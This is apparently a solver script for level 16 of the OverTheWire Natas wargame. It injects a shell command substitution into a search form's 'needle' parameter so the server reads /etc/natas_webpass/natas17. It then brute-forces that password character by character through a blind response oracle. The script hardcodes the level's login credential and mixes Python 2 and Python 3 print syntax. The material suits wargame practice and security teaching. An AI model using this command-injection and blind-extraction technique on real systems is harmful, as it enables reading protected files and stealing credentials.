import requests
from bs4 import BeautifulSoup
import string

class natas16():
    def __init__(self, url, user, password):
        self.url = url
        self.user = user
        self.password = password

    def check_pattern(self, pattern):
        content = requests.post(self.url,
                               auth=(self.user, self.password),
                               data={'needle': '$(sed s:%s:africans: /etc/natas_webpass/natas17)' % pattern,
                                     'submit': 'search'})
        return 'Africans' in str(BeautifulSoup(content.text, "lxml").pre)

    def get_length(self, max=50):
       for length in range(1,max):
           if self.check_pattern('.'*length):
               return length

    def get_alphabet(self):
        alphabet = ''
        for char in (string.digits + string.ascii_letters):
           if self.check_pattern('.*%s.*' % char):
               alphabet += char
        return alphabet

    def brute_password(self):
        length = self.get_length()
        alphabet = self.get_alphabet()
        password = ''
        print("""Bruteforcing password with parameters:
                 Length: %i
                 Alphabet: %s""" % (length, alphabet))
        for _ in range(length):
            for char in alphabet:
                if self.check_pattern("^%s.*" % (password + char)):
                    password += char
                    break
        return password


crack = natas16(user='natas16',
                password='WaIHEacj63wnNIBROHeqi3p9t0m5nhmh',
                url='http://natas16.natas.labs.overthewire.org/index.php')
print 'Password: %s' % crack.brute_password()
